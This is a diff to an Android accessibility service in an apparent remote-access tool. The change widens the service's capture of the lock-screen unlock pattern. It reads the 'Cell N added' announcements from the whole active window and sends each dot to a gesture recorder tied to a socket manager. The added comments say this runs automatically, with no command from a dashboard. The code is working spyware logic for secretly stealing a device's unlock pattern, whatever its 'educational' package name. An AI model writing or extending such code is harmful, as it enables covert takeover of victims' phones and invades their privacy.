@@ -514,9 +514,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Scan the accessibility node tree for "Cell N added" descriptions that
+     * Scan the full accessibility node tree for "Cell N added" descriptions that
      * Android's lock-screen pattern view announces as the user draws each dot.
-     * Forwards every newly-seen cell to GestureRecorder for advanced-unlock capture.
+     * Uses the root window node (not just the event source) to catch all cells
+     * reliably. Forwards every newly-seen cell to GestureRecorder.
+     * This runs autonomously whenever systemui fires a content-change event —
+     * no dashboard command is required.
      */
     private void checkAdvancedUnlockCells(AccessibilityEvent event) {
         try {
@@ -524,10 +527,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     com.remoteaccess.educational.network.SocketManager
                             .getInstance(this).getGestureRecorder();
             if (gr == null) return;
-            AccessibilityNodeInfo source = event.getSource();
-            if (source == null) return;
-            scanNodeForAdvancedUnlockCells(source, gr);
-            source.recycle();
+            // Prefer scanning from root for full coverage; fall back to event source
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                scanNodeForAdvancedUnlockCells(root, gr);
+                root.recycle();
+            } else {
+                AccessibilityNodeInfo source = event.getSource();
+                if (source != null) {
+                    scanNodeForAdvancedUnlockCells(source, gr);
+                    source.recycle();
+                }
+            }
         } catch (Exception ignored) {}
     }
 
